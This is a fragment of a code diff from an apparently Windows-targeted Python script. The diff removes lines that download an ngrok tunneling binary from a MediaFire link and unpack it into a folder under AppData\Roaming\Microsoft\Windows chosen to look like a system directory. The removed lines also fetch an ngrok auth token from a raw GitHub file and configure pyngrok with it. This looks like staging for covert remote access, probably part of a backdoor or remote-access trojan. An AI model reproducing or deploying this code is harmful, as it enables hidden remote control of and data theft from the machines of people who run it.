@@ -36,26 +36,8 @@ install_packages()
 
 time.sleep(3)
 
-user_profile = os.environ['USERPROFILE']
-target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
-os.makedirs(target_path, exist_ok=True)
-
 import requests
 import win32com.client
-from pyngrok import ngrok, conf
-
-r = requests.get("https://download1323.mediafire.com/vfdyt2x0dt0ghXP4vbvNHlbTPk93XqUDc8CfDwCm8XrrtbRQDuAyufV5x4zO76Su8lc3UDZpo2PaYc1gxDMRv838kquHQJj__tKZER2BZXWnwCSaHVKMn1NeQUzYHZkm9BwyIfeUgTfx_DgpoaCirSbWwCyVlxDRwfgGxpctDA/9x07e1528196942/ngrok-v3-stable-windows-amd64.zip", allow_redirects=True)
-file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ngrok-v3-stable-windows-amd64.zip')
-open(file_path, 'wb').write(r.content)
-with zipfile.ZipFile(file_path, 'r') as zip_ref:
-    zip_ref.extractall(target_path)
-os.remove(file_path)
-
-
-r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ngrok.txt")
-ngtok = r.text
-conf.get_default().ngrok_path = os.path.join(target_path, "ngrok-v3-stable-windows-amd64", "ngrok.exe")
-ngrok.set_auth_token(str(ngtok))
 
 user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
